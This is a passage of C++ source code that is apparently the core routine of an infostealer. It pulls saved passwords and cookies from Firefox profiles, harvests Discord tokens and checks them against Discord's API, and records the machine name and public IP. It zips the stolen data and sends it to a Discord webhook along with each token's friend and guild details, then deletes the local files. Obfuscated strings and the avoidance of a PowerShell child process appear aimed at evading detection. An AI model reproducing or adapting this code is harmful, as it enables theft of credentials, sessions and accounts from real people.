                    const auto& fp = ff_profiles[i];
                    bool is_last = (i == ff_profiles.size() - 1);

                    auto passwords = FirefoxExtractor::ExtractPasswords(fp.path);
                    auto cookies   = FirefoxExtractor::ExtractCookies(fp.path);

                    const char* pfx = is_last
                        ? "  " BOX_BL BOX_H BOX_H " "
                        : "  " BOX_T  BOX_H BOX_H " ";
                    const char* bar = is_last ? "       " : "  " BOX_V "    ";

                    std::cout << pfx << fp.name << (fp.is_default ? " [default]" : "") << "\n";
                    if (cookies.size())   std::cout << bar << "Cookies    " << cookies.size()   << "\n";
                    if (passwords.size()) std::cout << bar << "Passwords  " << passwords.size() << "\n";

                    if (options.write_to_file) {
                        std::string base = options.output_dir + "\\Firefox\\" + fp.name;

                        if (!cookies.empty())
                            SaveFile(base + "\\cookies.json",
                                DataFormatter::FormatCookiesJSON(cookies));

                        if (!passwords.empty())
                            SaveFile(base + "\\passwords.json",
                                DataFormatter::FormatPasswordsJSON(passwords));
                    }

                    ff_pass += passwords.size();
                    ff_ck   += cookies.size();
                    grand_pass   += passwords.size();
                    grand_cookie += cookies.size();
                }

                std::ostringstream ff_sum;
                if (ff_ck)   ff_sum << ff_ck   << " cookies";
                if (ff_pass) { if (!ff_sum.str().empty()) ff_sum << ", "; ff_sum << ff_pass << " passwords"; }
                ff_sum << " (" << ff_profiles.size() << " profile"
                       << (ff_profiles.size() != 1 ? "s" : "") << ")";
                std::cout << "      " << ff_sum.str() << "\n";
                if (options.write_to_file)
                    std::cout << "      " << options.output_dir << "\\Firefox\n";
            }
            std::cout << "\n";
        }

        // ── Discord token extraction (BEFORE zip so tokens enter archive) ─────
        std::vector<DiscordTokenEntry> dtokens;
        {
            std::string dcLine = "  " BOX_TL BOX_H BOX_H BOX_H BOX_H " Discord Tokens ";
            for (int i = 0; i < 47; i++) dcLine += BOX_H;
            std::cout << dcLine << "\n";

            dtokens = DiscordTokenExtractor::Extract();

            if (dtokens.empty()) {
                PFail("No Discord tokens found");
            } else {
                POk(std::to_string(dtokens.size()) + " token(s) found");
                PBlank();
                for (const auto& t : dtokens)
                    P("[" + t.source + "]  " + t.token);

                if (options.write_to_file) {
                    std::string path = options.output_dir + "\\Discord\\tokens.json";
                    SaveFile(path, DataFormatter::FormatDiscordTokensJSON(dtokens));
                    std::cout << "      " << options.output_dir << "\\Discord\n";
                }
            }
            std::cout << "\n";
        }

        // ── SendGrab overview embed + ZIP ─────────────────────────────────────
        if (options.send_to_discord) {
            GrabInfo gi;
            gi.passwords    = static_cast<int>(grand_pass);
            gi.cookies      = static_cast<int>(grand_cookie);
            gi.cards        = static_cast<int>(grand_pay);
            gi.machine_name = GetMachineName();
            gi.public_ip    = GetPublicIP();
            gi.output_label = gi.machine_name + "_" + gi.public_ip;

            if (options.write_to_file) {
                fs::path zip_path = fs::path(options.output_dir).parent_path()
                                  / (gi.output_label + ".zip");
                P("Creating ZIP...");

                // Flush logs to ensure they are written to disk before zipping
                g_logger.Info("Flushing logs before ZIP creation...");
                g_logger.Flush();
                g_capture.Flush();

                // Native ZIP — no powershell.exe child process
                gi.zip_path = CreateZip(options.output_dir, zip_path.string());

                // Close log handles before cleanup
                g_logger.SetLogFile("");
                g_capture.Close();

                if (!gi.zip_path.empty()) {
                    std::error_code sz_ec;
                    uintmax_t sz   = fs::file_size(fs::path(gi.zip_path), sz_ec);
                    if (sz_ec) sz  = 0;
                    gi.output_size = FormatSize(sz);
                    POk("ZIP: " + gi.zip_path + " (" + gi.output_size + ")");
                } else {
                    PFail("ZIP creation failed — sending embed only");
                    uintmax_t sz   = CalcDirSize(fs::path(options.output_dir));
                    gi.output_size = FormatSize(sz);
                }
                gi.file_tree = BuildFileTree(options.output_dir, gi.output_label + ".zip");
            }

            DiscordWebhook grabWh(options.webhook_url);
            bool ok = grabWh.SendGrab(gi);
            std::cout << "  " << (ok ? "[+]" : "[!]") << " Grab sent to webhook\n\n";

            if (auto_cleanup && (ok || !gi.zip_path.empty())) {
                std::error_code ec;
                if (!gi.zip_path.empty()) fs::remove(gi.zip_path, ec);
                fs::remove_all(fs::path(options.output_dir), ec);
            } else if (auto_cleanup && !ok) {
                PFail("Webhook failed — keeping local files for manual recovery");
            }
        }

        // ── Send individual Discord tokens to webhook ─────────────────────────
        if (options.send_to_discord && !dtokens.empty()) {
            DiscordWebhook wh(options.webhook_url);
            bool any_discord = false;

            g_logger.Info("=== TOKEN SEND LOOP START ===");
            g_logger.Info("Total tokens found: " + std::to_string(dtokens.size()));

            for (const auto& entry : dtokens) {
                g_logger.Info("Token source: '" + entry.source + "'");

                // Case-insensitive check for Discord app sources
                std::string lower_source = entry.source;
                std::transform(lower_source.begin(), lower_source.end(), lower_source.begin(), ::tolower);

                bool isDiscordApp = (lower_source.find("discord") != std::string::npos);
                g_logger.Info("Is Discord app: " + std::string(isDiscordApp ? "YES" : "NO"));

                if (!isDiscordApp) {
                    g_logger.Info("Skipping non-Discord token: " + entry.source);
                    continue;
                }

                if (!any_discord) {
                    PBlank();
                    P("Sending Discord tokens to webhook...");
                    any_discord = true;
                }

                g_logger.Info("Fetching /users/@me for: " + entry.source);
                auto resp = HttpClient::Get(XSTR("https://discord.com/api/v9/users/@me"),
                    {{XSTR("Authorization"), entry.token},
                     {"User-Agent", "Mozilla/5.0"}});

                if (!resp.success()) {
                    g_logger.Warning("/users/@me FAILED for " + entry.source +
                                     " (HTTP " + std::to_string(resp.status_code) + ")");
                    PFail("[" + entry.source + "] Invalid token (HTTP "
                        + std::to_string(resp.status_code) + ")");
                    continue;
                }

                g_logger.Info("/users/@me SUCCESS for: " + entry.source);

                try {
                    TokenInfo ti;
                    ti.token    = entry.token;
                    ti.source   = entry.source;
                    ti.userInfo = nlohmann::json::parse(resp.body);

                    g_logger.Info("Calling SendWebhook for: " + entry.source);
                    try { wh.SendWebhook(ti); } catch (...) { g_logger.Warning("SendWebhook exception for " + entry.source); }

                    g_logger.Info("Calling CheckTokenFriends for: " + entry.source);
                    try { wh.CheckTokenFriends(ti); } catch (...) { g_logger.Warning("CheckTokenFriends exception for " + entry.source); }

                    g_logger.Info("Calling CheckTokenGuilds for: " + entry.source);
                    try { wh.CheckTokenGuilds(ti); } catch (...) { g_logger.Warning("CheckTokenGuilds exception for " + entry.source); }

                    POk("[" + entry.source + "] Sent");
                    g_logger.Info("=== Token send COMPLETE for: " + entry.source + " ===");
                } catch (const std::exception& e) {
                    g_logger.Error("JSON parse error for " + entry.source + ": " + std::string(e.what()));
                    PFail("[" + entry.source + "] JSON parse error: " + std::string(e.what()));
                }
            }

            g_logger.Info("=== TOKEN SEND LOOP END ===");

            if (!any_discord)
                P("No Discord app tokens to send (browser tokens saved to ZIP)");
        }

        g_capture.Close();
        return 0;

    } catch (const std::exception& e) {
        std::cerr << "\n  [!] Fatal: " << e.what() << "\n\n";
        g_capture.Close();
        return 1;
    }
}
